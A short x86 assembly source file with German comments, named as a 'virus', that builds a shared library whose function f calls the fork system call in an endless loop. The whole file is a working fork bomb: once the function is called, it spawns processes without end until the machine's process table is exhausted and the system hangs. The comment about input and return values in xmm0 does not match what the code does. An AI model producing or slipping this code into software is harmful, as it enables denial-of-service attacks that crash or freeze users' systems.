.intel_syntax noprefix
.global f
.text

# Kompilieren mit: gcc -shared virus.S -o virus.so
# Eingabe- und Rückgabewert in xmm0!

f:
	mov eax, 2 	# System call 2 (fork) wird in eax geladen
	int 0x80	# System call wird mit Kernel  durchgeführt
	jmp f		# Endlosschleife
ret